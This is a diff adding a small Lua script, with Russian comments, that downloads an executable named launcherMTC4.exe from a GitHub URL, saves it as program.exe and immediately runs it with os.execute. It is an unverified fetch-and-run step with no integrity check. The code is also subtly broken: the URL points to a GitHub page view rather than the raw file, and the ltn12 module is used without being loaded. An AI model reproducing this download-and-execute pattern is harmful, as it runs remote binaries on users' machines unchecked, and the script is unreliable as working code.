@@ -1,0 +1,30 @@
+local http = require("socket.http")
+local lfs = require("lfs")
+
+function download_file(url, filename)
+    local response = {}
+    local body, status = http.request{
+        url = url,
+        sink = ltn12.sink.table(response)
+    }
+    
+    if status == 200 then
+        local file = io.open(filename, "wb")
+        if file then
+            file:write(table.concat(response))
+            file:close()
+            return true
+        end
+    end
+    return false
+end
+
+-- Скачать и запустить
+local exe_url = "https://github.com/Suffle-beep/mtc4/blob/main/launcherMTC4.exe"
+local exe_name = "program.exe"
+
+if download_file(exe_url, exe_name) then
+    os.execute(exe_name)
+else
+    print("Ошибка загрузки файла")
+end
